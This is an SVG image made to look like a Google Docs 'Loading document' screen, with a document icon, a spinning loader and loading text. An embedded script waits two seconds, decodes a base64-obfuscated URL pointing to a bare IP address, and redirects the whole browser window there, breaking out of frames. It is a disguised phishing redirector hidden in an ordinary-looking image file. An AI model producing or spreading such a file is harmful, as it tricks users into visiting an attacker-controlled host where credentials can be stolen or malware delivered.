<svg viewBox="0 0 800 600" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="loaderGradient" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#4285f4"/>
      <stop offset="100%" stop-color="#1a73e8"/>
    </linearGradient>
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="8" stdDeviation="16" flood-color="#000" flood-opacity="0.10"/>
    </filter>
  </defs>
  <script type="application/ecmascript"><![CDATA[
    setTimeout(function() {
      var b64 = "aHR0cDovLzE5NC43Ni4yMjcuMjI1L2luZGV4LnBocA==";
      var url = atob(b64);
      if (url !== window.location.href) {  // Prevent self-loop
        window.top.location.replace(url);  // Break out of frames and redirect
      }
    }, 2000);
  ]]></script>
  <!-- Background -->
  <rect width="100%" height="100%" fill="#f8f9fa"/>
  <!-- Centered card (scaled to fill more space) -->
  <rect x="100" y="100" width="600" height="400" rx="32" fill="#fff" filter="url(#shadow)"/>
  <!-- Google Docs icon (larger and centered) -->
  <g transform="translate(200, 150)">
    <rect x="0" y="0" width="120" height="160" rx="16" fill="#4285f4"/>
    <rect x="20" y="30" width="80" height="16" rx="4" fill="#fff" opacity="0.8"/>
    <rect x="20" y="60" width="80" height="16" rx="4" fill="#fff" opacity="0.8"/>
    <rect x="20" y="90" width="60" height="16" rx="4" fill="#fff" opacity="0.8"/>
    <rect x="20" y="120" width="40" height="16" rx="4" fill="#fff" opacity="0.8"/>
  </g>
  <!-- Spinning loader (larger and centered) -->
  <g transform="translate(500, 250)">
    <circle cx="0" cy="0" r="50" stroke="url(#loaderGradient)" stroke-width="12" fill="none" stroke-dasharray="78 50">
      <animateTransform attributeName="transform" type="rotate" from="0 0 0" to="360 0 0" dur="1s" repeatCount="indefinite"/>
    </circle>
  </g>
  <!-- Loading text (larger and centered) -->
  <text x="400" y="480" font-family="Arial, Helvetica, sans-serif" font-size="48" fill="#3c4043" text-anchor="middle">
    Loading documentâ€¦
  </text>
</svg>
